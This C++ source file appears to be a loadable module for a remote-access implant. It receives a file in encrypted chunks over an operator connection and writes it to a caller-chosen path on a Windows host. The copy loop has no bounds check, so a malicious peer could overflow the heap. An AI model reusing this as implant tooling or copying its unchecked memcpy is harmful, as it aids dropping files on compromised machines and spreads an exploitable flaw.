#include <Windows.h>
#include <iostream>
#include <string>
#include <structs.h>

NTSTATUS SaveFile(PUCHAR dataBlob, ULONG dataSz, LPCSTR filePath)
{
    BOOL bErrorFlag = FALSE;
    DWORD dwBytesWritten = 0;
    HANDLE hFile = NULL;

    hFile = CreateFileA(filePath,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    bErrorFlag = WriteFile(
        hFile,
        dataBlob,
        dataSz,
        &dwBytesWritten,
        NULL);

    CloseHandle(hFile);
    
    if (!bErrorFlag && GetLastError() != ERROR_SUCCESS)
    {
        return GetLastError();
    }
    return 0;
}

extern "C" __declspec(dllexport) ULONG ModuleEntrypoint(MODULE_CONTEXT ctx) {
	FILEPART file_part = { 0 };
	FILEINFO file_info = { 0 };
	ctx.recv_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&file_info, sizeof(file_info));

	char* file_buffer = new char[file_info.file_size];
	int total_size = 0;

	for (int i = 0; i < file_info.part_count; i++)
	{
		ctx.recv_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&file_part, sizeof(file_part));
		memcpy(file_buffer + total_size, file_part.file_part, file_part.part_length);
		total_size += file_part.part_length;
	}

    NTSTATUS status = SaveFile((PUCHAR)file_buffer, total_size, ctx.argv.at(0).c_str());
	return status;
}